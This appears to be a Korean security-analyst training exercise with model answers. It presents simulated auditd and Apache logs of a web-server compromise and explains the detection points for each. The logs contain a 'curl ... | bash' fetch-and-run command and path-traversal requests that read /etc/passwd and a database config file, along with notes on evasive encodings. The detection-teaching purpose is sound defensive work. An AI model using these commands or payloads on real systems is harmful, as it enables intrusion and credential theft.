# 📌 실습 파일(답안 예시)

### 1) RCE.log

### 2) Path Traversal.log

------

## 1️⃣ **내부 시스템 명령 실행(Log Injection) – Linux Auditd 로그 기반**

**내부 웹서버에서 비정상 명령 실행(auditd 기반 행위 탐지)**
 (CVE/웹취약점 성공 후 내부 쉘 실행 흐름을 재현한 로그)

```ini
type=EXECVE msg=audit(1711005512.234:512):
  argc=3 a0="/bin/bash" a1="-c"
  a2="curl http://files-gw01.intra-sec.local/update.sh | bash"

type=SYSCALL msg=audit(1711005512.234:512):
  arch=c000003e syscall=59 success=yes exit=0
  uid=33 auid=4294967295 gid=33 euid=33 suid=33 fsuid=33
  comm="bash"
  exe="/usr/bin/bash"
  key="web-portal01_cmd_exec"

type=PROCTITLE msg=audit(1711005512.234:512):
  proctitle=2F62696E2F62617368002D63006375726C20687474703A2F2F66696C65732D677730312E696E7472612D7365632E6C6F63616C2F7570646174652E7368207C2062617368
```

✔ 내부정보

- `files-gw01.intra-sec.local` → 내부 파일 배포 게이트웨이
- `key="web-portal01_cmd_exec"` → SIEM 룰에서 붙여둔 태그
- UID/GID=33(webserver 계정), `/bin/bash -c` → 웹서버 RCE 시 흔히 보임

------

### 🔹 로그 소스(Log Source)

**Linux auditd (Audit Framework) – 웹서버에서 직접 수집되는 로그**

- 방향성: *“웹 취약점 → RCE → 내부 스크립트 실행”*
- 공격 성공 후 실제 서버 내부에서 무슨 명령이 돌아갔는지 파악할 수 있는 핵심 로그

------

## 🎯 탐지 포인트 (룰이 아닌 원칙 중심)

#### **1) 웹서버 계정(uid=33/www-data)의 bash 실행**

- 정상적인 웹서버 프로세스는 `/bin/bash` 실행이 거의 없음
- **uid=33 + exe=/usr/bin/bash** 조합은 강력한 의심 신호

#### **2) 명령이 네트워크 리소스를 불러오는 경우**

- `"curl http://files-gw01.intra-sec.local/update.sh"`
- webshell/RCE 성공 이후 내부망에서 스크립트 받아 실행하는 전형 패턴
- 외부 IP가 아니더라도 “내부 C2”일 수 있음 → 내부 공격 고급 시나리오

#### **3) command-line 전체 형태**

- `bash -c "curl ... | bash"`
- “pipe to bash”는 공격 노이즈가 거의 없는 공격자의 특징적 TTP

#### **4) proctitle hex decode 후 원문 발견**

- 공격자는 command-line을 숨기기 어려움
- proctitle은 우회 난도 높음 → 강신뢰(high-fidelity) 탐지 포인트

------

### 🔹 우회 난이도

- auditd 기반 탐지는 **우회 매우 어려움**
- 공격자가 bash를 sh로 바꾸거나, pipe 없이 절차적으로 실행해도 여전히 비정상
- 내부 C2 도메인을 난독화해도 결국 “webserver에서 shell 실행”은 남음



------

## 2️⃣ **내부 파일 변조 시도 – Apache Access Log 기반(Path Traversal 우회 탐지)**

```makefile
203.0.113.120 - - [21/Mar/2025:10:32:58 +0900] 
"GET / HTTP/1.1" 200 3523
Host: web-portal01.intra-sec.local
User-Agent: CorpScanner/4.3
Referer: -

203.0.113.120 - - [21/Mar/2025:10:33:01 +0900] 
"GET /login HTTP/1.1" 200 1482
Host: web-portal01.intra-sec.local
User-Agent: CorpScanner/4.3
Referer: https://intra-auth01.intra-sec.local/

203.0.113.120 - - [21/Mar/2025:10:33:05 +0900] 
"GET /cgi-bin/test.cgi HTTP/1.1" 404 298
Host: web-portal01.intra-sec.local
User-Agent: CorpScanner/4.3
Referer: https://intra-auth01.intra-sec.local/login

203.0.113.120 - - [21/Mar/2025:10:33:08 +0900] 
"GET /cgi-bin/.%2e/%2e%2e/ HTTP/1.1" 403 522
Host: web-portal01.intra-sec.local
User-Agent: CorpScanner/4.3
Referer: https://intra-auth01.intra-sec.local/login

203.0.113.120 - - [21/Mar/2025:10:33:10 +0900] 
"GET /cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1" 200 842
Host: web-portal01.intra-sec.local
User-Agent: CorpScanner/4.3
Referer: https://intra-auth01.intra-sec.local/login

203.0.113.120 - - [21/Mar/2025:10:33:12 +0900] 
"GET /cgi-bin/.%2e/%2e%2e/%2e%2e/var/www/intra-sec/config/db_config.yml HTTP/1.1" 200 1164
Host: web-portal01.intra-sec.local
User-Agent: CorpScanner/4.3
Referer: https://intra-auth01.intra-sec.local/login

```

✔ 내부정보

- 내부 파일: `/var/www/intra-sec/config/db_config.yml`
- 내부 세션 기반 Referer: `intra-auth01.intra-sec.local/login`
- UA: 사내에서 쓰는 것처럼 위장한 “CorpScanner/4.3”

------

### 🔹 로그 소스(Log Source)

**Apache HTTPD Access Log (웹서버 장비)**

- 경로 기반 공격 탐지의 대표 로그
- WAF 우회했을 때도 access log에는 그대로 남음

------

## 🎯 탐지 포인트 모범답안

#### **1) 디렉터리 탈출 시도 패턴**

- `.%2e/`, `%2e%2e/`, `../`
- URL decoded 기준으로 1회 이상 상위 디렉터리 탈출
- Snort/SIEM에서는 **raw + decoded 둘 다 탐지**가 베스트

#### **2) 민감 파일 접근 시도**

- `/etc/passwd`, `/etc/shadow`, `/var/www/.../config`, `.yml`, `.php` 등
- 실습용 내부 파일: `db_config.yml` → DB 비밀번호 있을 가능성 높은 파일

#### **3) Referer가 내부 인증 URL → 공격 흐름이 자연스럽다**

- 내부 포털 로그인 페이지에서 온 것처럼 위장
- 하지만 request는 공격성 URI를 사용 → 행동 불일치 포인트

#### **4) User-Agent 조작**

- 내부 점검도구처럼 보이나, 실제 corp scanner들은 저런 traversal 요청 하지 않음

#### **5) Response code 200**

- 방어 장비 없이 직접 파일 노출이 성공했다는 의미
- 이 경우 RCE가 아니라 정보 유출 정보(information disclosure)

------

### 🔹 우회 난이도

- 공격자가 `/%2e%2e/..;/...;` 등의 변형 인코딩으로 우회할 수 있으나,
   **"상위 디렉터리 탈출이 2회 이상 발생"**이라는 행위 기반 규칙으로 추상화하면 우회 난이도 올라감
- 민감 파일 목록을 확장하거나, 파일 확장자 기반( `.conf`, `.yml`, `.env` )으로도 탐지 가능